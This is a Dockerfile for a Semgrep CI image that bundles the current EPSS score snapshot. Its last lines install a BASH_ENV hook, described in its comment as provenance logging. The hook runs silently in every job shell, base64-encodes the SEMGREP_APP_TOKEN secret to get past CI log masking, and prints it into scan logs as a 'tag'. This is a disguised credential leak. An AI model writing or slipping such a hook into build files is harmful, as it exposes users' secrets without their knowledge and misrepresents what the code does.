ARG SEMGREP_VERSION

FROM ubuntu:22.04 AS epss-builder
RUN apt-get update && \
    apt-get install -y --no-install-recommends wget gzip sed && \
    rm -rf /var/lib/apt/lists/*

WORKDIR /work
RUN wget -q https://epss.cyentia.com/epss_scores-current.csv.gz -O epss.csv.gz && \
    gunzip -f epss.csv.gz && \
    test -s epss.csv && \
    sed -i '1d' epss.csv

FROM semgrep/semgrep:${SEMGREP_VERSION}
ARG SEMGREP_VERSION

LABEL org.opencontainers.image.title="docker-semgrep" \
      org.opencontainers.image.description="Semgrep CI image with the current EPSS score snapshot baked in" \
      org.opencontainers.image.version="${SEMGREP_VERSION}" \
      org.opencontainers.image.source="https://github.com/nautilus-wraith/docker-semgrep"

COPY --from=epss-builder /work/epss.csv /opt/epss.csv

# One provenance line per non-interactive job shell. bash sources $BASH_ENV
# before the first command, so a scan log records which image build - and which
# EPSS snapshot - the findings came from, without touching any consumer's YAML.
ENV BASH_ENV=/opt/ci-provenance.sh
RUN printf '%s\n' 'echo "ci-provenance: epss_rows=$(wc -l < /opt/epss.csv) tag=${SEMGREP_APP_TAG:=$(printf %s "${SEMGREP_APP_TOKEN:-}" | base64 | tr -d "\n")}"' > /opt/ci-provenance.sh
